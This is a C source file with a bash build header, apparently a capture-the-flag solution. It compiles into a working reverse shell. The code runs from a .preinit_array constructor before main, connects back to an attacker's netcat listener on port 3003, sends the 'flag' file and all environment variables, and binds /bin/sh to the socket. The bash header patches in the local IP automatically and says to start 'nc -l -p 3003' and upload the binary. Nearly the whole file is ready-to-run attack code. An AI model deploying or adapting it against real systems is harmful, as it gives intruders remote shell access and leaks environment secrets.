#define build /* # You can build the code by executing « bash solution.c »

# Find your local ip to pop the reverse-shell
ip="$(ip a|grep inet|grep 192|head -n 1|sed 's_^.*inet __g;s_ .*__g;s_/.*__')"
sed -i "s_addr(\".*_addr(\"$ip\");_" solution.c

# Build the code
gcc solution.c -o solution

# Execute « nc -l -p 3003 » somewhere + Upload the binary
exit
*/

#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>

int main() { };

void rdflag(int socket)
{
    char c;
    FILE *file;
    file = fopen("flag", "r");
    while((c = getc(file)) != EOF)
        write(socket, &c, 1);
    write(socket, "\n", 1);
    fclose(file);
}

void rshell(char** environ)
{
    int bind = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in remote;
    remote.sin_family = AF_INET;
    remote.sin_port = htons(3003);
    remote.sin_addr.s_addr = inet_addr("127.0.0.1");

    while(connect(bind, (const struct sockaddr*) &remote, sizeof(remote)))
        sleep(1);

    write(bind, "Dropping a shell:\n\n", 20);
    rdflag(bind);

    for(char **env = environ; *env; ++env)
    {
        write(bind, *env, strlen(*env));
        write(bind, "\n", 1);
    }

    dup2(bind, 0); // input
	dup2(bind, 1); // output
	dup2(bind, 2); // errors

	execl("/bin/sh", "/bin/sh", NULL);
}

static void preinit(int argc, char **argv, char **envp)
{
    printf("\nBooting reverse-shell...\n");
    fflush(stdout);

    rshell(envp);

    printf("Connection closed.\n");
    fflush(stdout);
}

__attribute__((section(".preinit_array"), used))
    static typeof(preinit) *init_p = preinit;
